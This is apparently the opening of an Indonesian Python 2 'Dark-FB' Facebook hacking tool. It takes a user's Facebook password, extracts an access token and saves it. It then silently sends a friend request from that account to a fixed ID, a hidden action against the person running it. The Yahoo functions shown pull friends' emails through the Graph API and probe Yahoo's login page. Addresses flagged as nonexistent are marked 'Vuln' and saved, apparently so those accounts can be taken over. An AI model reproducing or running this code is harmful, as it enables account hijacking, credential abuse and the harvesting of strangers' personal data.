import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print '\x1b[1;91m[!] Closed'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = " \x1b[1;97m█████████\n \x1b[1;97m█▄█████▄█         \x1b[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;97m█ \x1b[1;91m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;97m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;97m█ \x1b[1;91m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mPremium\n \x1b[1;97m█████████         \x1b[1;96m«==========✧==========»\n \x1b[1;97m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m The Magizz  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttps://github.com/TheMagizz\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/rizz.magizz\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mSandi \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Gagal Masuk'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print logo
            print '\x1b[1;91m[!] Tidak Ada Koneksi'
            keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + (39 - len(nama)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m FBID \x1b[1;91m: \x1b[1;92m' + id + (39 - len(id)) * '\x1b[1;97m ' + '║'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Subs \x1b[1;91m: \x1b[1;92m' + sub + (39 - len(sub)) * '\x1b[1;97m ' + '║'
    print '\x1b[1;97m╠' + 50 * '\xe2\x95\x90' + '╝'
    print '║-> \x1b[1;37;40m1. User Information'
    print '║-> \x1b[1;37;40m2. Hack Facebook Account'
    print '║-> \x1b[1;37;40m3. Bot'
    print '║-> \x1b[1;37;40m4. Others'
    print '║-> \x1b[1;37;40m5. Update'
    print '║-> \x1b[1;37;40m6. Logout'
    print '║-> \x1b[1;31;40m0. Exit'
    print '\x1b[1;37;40m║'
    pilih()

def menu_yahoo():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. From Friends'
    print '║-> \x1b[1;37;40m2. From File'
    print '║-> \x1b[1;31;40m0. Back'
    print '\x1b[1;37;40m║'
    yahoo_pilih()

def yahoo_pilih():
    go = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if go == '':
        print '\x1b[1;91m[!] Can\'t empty'
        yahoo_pilih()
    else:
        if go == '1':
            yahoofriends()
        else:
            if go == '2':
                yahoolist()
            else:
                if go == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mnot found'
                    yahoo_pilih()


def yahoofriends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(friends.text)
    save = open('MailVuln.txt', 'w')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + nama
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail + ' \x1b[1;97m[\x1b[1;92m' + vulnot + '\x1b[1;97m]'
        except KeyError:
            pass

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        files = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    mpsh = []
    jml = 0
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
    save = open('MailVuln.txt', 'w')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
    print
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print '\x1b[1;91m ' + mail
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;92m ' + mail
            else:
                print '\x1b[1;91m ' + mail

    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    print '\x1b[1;91m[+] \x1b[1;97mSaved \x1b[1;91m:\x1b[1;97m MailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()
